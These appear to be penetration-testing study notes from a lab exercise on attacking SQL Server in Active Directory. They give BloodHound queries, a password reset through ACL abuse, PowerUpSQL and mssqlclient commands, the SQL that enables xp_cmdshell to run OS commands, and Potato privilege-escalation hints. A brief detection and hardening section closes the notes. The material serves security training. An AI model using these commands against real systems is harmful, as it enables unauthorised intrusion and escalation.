

## Summary

- SQL Server instances commonly expose privileged user/service accounts with `sysadmin` rights.
    
- Credentials can be obtained via: Kerberoasting, LLMNR/NBT-NS spoofing, password spraying, or by finding connection strings (e.g., `web.config`) with tools like **Snaffler**.
    
- **BloodHound** helps find `SQLAdmin` relationships; combine ACL abuse and local password changes to authenticate and run OS commands via SQL.
    
- Common attack chain: discover → authenticate → enable `xp_cmdshell` (or use SQL Agent) → run OS commands → escalate (e.g., `SeImpersonatePrivilege` → JuicyPotato/RoguePotato).
    

---

## Recon / Discovery

- Look for SQL servers in the domain and accounts with `SQLAdmin` / `sysadmin` rights.
    
- Tools:
    
    - BloodHound (check **Node Info** for SQLAdmin edges or run Cypher queries).
        
    - PowerUpSQL (PowerShell module) — domain enumeration helpers.
        
    - Impacket `mssqlclient.py` — connect from Linux.
        
    - Snaffler — hunt for config files (e.g., `web.config`) with connection strings.
        

### Useful BloodHound Cypher to find SQLAdmin edges

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer)
RETURN p2
```

![[Pasted image 20251004194007.png]]
---

## ACL abuse → change password → authenticate

- If you have ACL rights to change a user password (e.g., `wley` can reset `damundsen`), change the password and authenticate to the SQL instance as that user.
    
- Example: changed `damundsen` password to `SQL1234!` (example only, use valid creds in real test).
    

---

## PowerUpSQL (Windows) — quick commands

Load module and enumerate:

```powershell
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb> Import-Module .\PowerUpSQL.ps1
PS C:\htb> Get-SQLInstanceDomain
```

Sample output fields to note:

- `ComputerName`
    
- `Instance` (host,port)
    
- `DomainAccount` / `DomainAccountCn`
    
- `Service` / `SPN` / `LastLogon`
    

Query example:

```powershell
PS C:\htb> Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" `
  -username "INLANEFREIGHT\damundsen" -password "SQL1234!" -query 'Select @@version'
```

- If connection succeeds, you can run arbitrary T-SQL queries; some allow OS interaction.
    

---

## Impacket `mssqlclient.py` (Linux)

Usage and options:

```
$ mssqlclient.py  # shows options
```

Connect example (Windows auth):

```
$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Password:
```

- On connect, type `help` to see commands.
    

Common `mssqlclient` shell cmds:

```
lcd {path}                 - change local dir
exit                       - terminate session
enable_xp_cmdshell         - enable xp_cmdshell
disable_xp_cmdshell        - disable xp_cmdshell
xp_cmdshell {cmd}          - run OS command via xp_cmdshell
sp_start_job {cmd}         - execute via SQL Agent (blind)
! {cmd}                    - execute local shell cmd
```

---

## Enabling and using `xp_cmdshell`

1. Enable:
    

```sql
-- via SQL session
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Or via `mssqlclient` shortcut:

```
SQL> enable_xp_cmdshell
```

2. Execute OS commands:
    

```sql
xp_cmdshell 'whoami /priv';
xp_cmdshell 'ipconfig /all';
xp_cmdshell 'dir C:\';
```

- `xp_cmdshell` allows running arbitrary OS commands if account has rights to enable/execute it.
    

---

## Privilege enumeration & escalation hints

- After running `xp_cmdshell whoami /priv`, note privileges:
    
    - `SeImpersonatePrivilege` — commonly usable with **JuicyPotato**, **RoguePotato**, **PrintSpoofer** to escalate to SYSTEM.
        
    - `SeAssignPrimaryTokenPrivilege` / `SeIncreaseQuotaPrivilege` / others — take note which are enabled/disabled.
        
- If `SeImpersonatePrivilege` is present and target OS/NT service configuration is exploitable, pursue token impersonation exploit to SYSTEM.
    

---

## Short attack flow (cheat-sheet)

1. [ ] Find SQL instances & SQLAdmin accounts (BloodHound / Snaffler / nmap / PowerUpSQL).
    
2. [ ] Obtain/obtain ability to change account password via ACL / Kerberoast / other creds.
    
3. [ ] Authenticate to SQL (PowerUpSQL / mssqlclient).
    
4. [ ] Enable `xp_cmdshell` (or abuse SQL Agent jobs).
    
5. [ ] Run OS commands, dump credentials, enumerate privileges.
    
6. [ ] If `SeImpersonatePrivilege` available → escalate with JuicyPotato/PrintSpoofer/RoguePotato.
    
7. [ ] Expand laterally from SYSTEM context.
    

---

## Quick detection / defense notes (blue team)

- Monitor and alert on:
    
    - Enabling `xp_cmdshell` or changes to `show advanced options`.
        
    - Creation or modification of SQL Agent jobs executing OS commands.
        
    - Unusual domain account SQL authentications, especially from non-app servers.
        
    - Password changes for privileged SQL accounts by unexpected principals.
        
- Hardening recommendations:
    
    - Disable `xp_cmdshell` unless strictly required.
        
    - Limit service accounts and avoid using domain admins as SQL service accounts.
        
    - Use Managed Service Accounts or gMSAs for SQL services where possible.
        
    - Monitor BloodHound-like graphs internally to proactively identify risky `SQLAdmin` relationships.
        
